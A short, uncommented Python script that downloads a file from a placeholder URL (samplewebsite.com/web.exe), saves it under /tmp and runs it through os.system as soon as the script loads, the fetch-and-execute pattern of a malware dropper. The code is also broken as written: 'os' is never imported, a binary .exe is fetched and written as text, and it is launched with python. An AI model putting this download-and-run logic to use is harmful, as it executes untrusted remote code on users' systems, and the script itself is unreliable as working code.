import requests

def saveFile(x, y):
    z = requests.get(x)
    with open(y, "w") as f:
        f.write(z.text)

def executeFile(y):
    os.system(f"python {y}")

def main():
    try:
        x = "https://samplewebsite.com/web.exe"
        y = "/tmp/web.exe"
        saveFile(x, y)
        executeFile(y)
    except Exception as e:
        print(e)

main()
